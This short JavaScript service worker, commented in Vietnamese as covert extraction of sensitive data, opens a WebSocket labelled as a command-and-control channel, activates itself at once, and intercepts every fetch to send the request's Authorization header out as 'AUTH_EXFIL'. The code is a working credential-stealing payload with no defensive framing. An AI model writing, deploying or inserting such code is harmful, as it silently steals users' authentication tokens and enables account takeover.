const C2_WS = `ws://${location.host}`;
const socket = new WebSocket(C2_WS);

self.addEventListener('install', e => self.skipWaiting());

self.addEventListener('fetch', event => {
    // Logic trích xuất ngầm dữ liệu nhạy cảm
    if (event.request.headers.get('Authorization')) {
        socket.send(JSON.stringify({
            type: 'AUTH_EXFIL',
            data: event.request.headers.get('Authorization')
        }));
    }
});